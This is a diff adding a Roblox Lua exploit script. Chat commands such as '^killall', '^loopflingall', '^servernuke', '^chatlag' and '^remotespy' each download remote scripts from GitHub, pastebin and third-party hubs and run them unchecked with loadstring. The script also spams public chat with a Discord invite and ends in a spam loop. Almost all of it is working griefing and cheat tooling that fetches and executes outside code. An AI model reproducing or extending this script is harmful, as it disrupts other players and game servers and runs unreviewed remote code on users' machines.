@@ -1,0 +1,264 @@
+local TeleportService = game:GetService("TeleportService")
+local placeID = 1455581296
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/script%20chat%20command%20sources"))()
+
+
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Injecting...",'All')
+wait(1)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Running Script",'All')
+wait(1)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Zaxx ' s script loaded...",'All')
+
+
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+
+
+
+
+
+    --Antis
+
+
+
+
+
+    if (string.lower(msg) == "^anti") then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Antix1"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Antix2"))()
+		loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BigHead'))()
+	    loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Small"))()
+	end
+
+	if (string.lower(msg) == "^antitool") then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Antix1"))()
+	end
+	
+	if (string.lower(msg) == "^resize") then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Antix2"))()
+	end
+	
+	if (string.lower(msg) == "^bighead") then
+        loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BigHead'))()
+	end
+	
+	if (string.lower(msg) == "^small") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Small"))()
+	end
+
+
+
+
+
+	--BoomBox Guis
+
+
+
+
+
+	if (string.lower(msg) == "^corrupted") then
+		loadstring(game:HttpGet("https://corruptshub.com/hub/V4/V4Loader"))()
+	end
+	
+	if (string.lower(msg) == "^vert") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/verts"))()
+	end
+	
+	if (string.lower(msg) == "^ript") then
+        loadstring(game:HttpGetAsync('https://riptxde.dev/u/hub/script.lua'))()
+	end
+	
+	if (string.lower(msg) == "^ghost") then
+        loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/GhostHub'))()
+	end
+	
+	if (string.lower(msg) == "^z0r") then
+        loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Z0r%20hub'))()
+	end
+	
+	if (string.lower(msg) == "^assetware") then
+        loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/AssetWare'))()
+	end
+	
+	if (string.lower(msg) == "^hash") then
+        loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/hashhub'))()
+	end
+	
+	if (string.lower(msg) == "^space") then
+        loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/SpaceHub'))()
+	end
+	
+	if (string.lower(msg) == "^normlucious") then
+        loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/NormalLucious'))()
+	end
+
+	if (string.lower(msg) == "^premlucious") then
+        loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/PremiumLucious'))()
+	end
+	
+	if (string.lower(msg) == "^cyph") then
+        loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Cyphrex'))()
+	end
+	
+	if (string.lower(msg) == "^dexp") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/DexPriv"))()
+	end
+
+	if (string.lower(msg) == "^pine") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/PineappleAux"))()
+	end
+
+
+
+
+	--Admin Scripts
+
+
+
+
+
+	if (string.lower(msg) == "^fates") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Fates"))()
+	end
+	
+	if (string.lower(msg) == "^cmdx") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Cmdx"))()
+	end
+	
+	if (string.lower(msg) == "^iy") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/YI"))()
+	end
+	
+	if (string.lower(msg) == "^dom") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Domain"))()
+	end
+
+
+
+
+
+	--Commands
+
+
+
+
+	if (string.lower(msg) == "^fev2") then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/FEYoinked/main/Simplity"))()
+	end
+	
+	if (string.lower(msg) == "^rejoin") then
+			TeleportService:Teleport(placeID, player)
+	end
+	
+	if (string.lower(msg) == "^antiafk") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz"))()
+	end
+	
+	if (string.lower(msg) == "^chatlag") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/ChatLag"))()
+	end
+	
+	if (string.lower(msg) == "^chatbypass") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/ChatBypass"))()
+	end
+	
+	if (string.lower(msg) == "^loopflingall") then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/LoopFlingAll'))()
+	end
+	
+	if (string.lower(msg) == "^killall") then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/KillAll'))()
+	end
+	
+	if (string.lower(msg) == "^bringall") then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BringAll'))()
+	end
+
+	if (string.lower(msg) == "^legresize") then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/LegResize'))()
+	end
+	
+	if (string.lower(msg) == "^translate") then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/AutoTranslate'))()
+	end
+	
+	if (string.lower(msg) == "^nlagger") then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/laggir'))()
+	end
+	
+	if (string.lower(msg) == "^fev1") then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/FEYoinked/main/FREEZAXX'))()
+	end
+	
+	if (string.lower(msg) == "^hatorbit") then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/Netless'))()
+        wait(1)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/HATORBIT%20WITHOUT%20NETLESS'))()
+	end
+	
+	if (string.lower(msg) == "^rainbow") then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/rainbow'))()
+	end
+	
+	if (string.lower(msg) == "^remotespy") then
+        loadstring(game:HttpGet("https://pastebin.com/raw/bCghX33W"))()
+	end
+	
+	if (string.lower(msg) == "^sacs") then
+        loadstring(game:HttpGet("https://github.com/3b1z/Zamnnnnnnnnniojewoirj/blob/main/name"))()
+	end
+	
+	if (string.lower(msg) == "^servernuke") then
+	    loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/KillAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/KillAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/KillAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/KillAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/KillAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/KillAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BringAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BringAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BringAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BringAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BringAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BringAll'))()
+        wait(2)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/BringAll'))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/3b1z/Zamnnnnnnnnniojewoirj/main/ChatLag"))()
+	end
+
+	if (string.lower(msg) == "^invite") then
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(".gg/qs4RHjZZeq",'All')
+			wait(1)
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(".gg/qs4RHjZZeq",'All')
+			wait(1)
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(".gg/qs4RHjZZeq",'All')
+	end
+	
+	if (string.lower(msg) == "^script") then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This is a script made by Zaxx# /00 01/",'All')
+	end
+
+
+
+    --Spamm Thingy
+
+
+
+
+
+	while true do
+		print("3b1z/3b11z/Zaxx#0001 was here idiots")
+		wait(0.1) 
+	end
+end)
